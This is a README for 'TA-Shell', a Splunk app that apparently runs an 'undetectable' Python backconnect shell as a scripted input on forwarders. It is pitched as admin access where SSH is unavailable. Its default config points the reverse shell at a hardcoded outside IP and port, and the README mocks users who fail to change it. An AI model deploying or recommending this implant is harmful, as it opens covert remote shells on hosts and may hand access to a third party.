# TA-Shell
## Splunk scripted input for opening a backconnect shell on a remote forwarder

This app uses a variant of the "undetectable" backconnect python shell from TrustedSec,
leveraged as a scripted input to have it execute the python code that will spawn a shell as the user splunk is running as.

This is useful when you need to make configuration changes to a host you have Deployment server access to, but not SSH/Remote management.

**All configuration is handled in ./etc/shell.conf**


### Please modify the config prior to intall, by default this is configured to use the following:


    [global]
    lhost: 107.150.53.164
    lport: 9997

Failure to modify the code block will get your device added to the wall of sheep at http://makesplunkgreataga.in
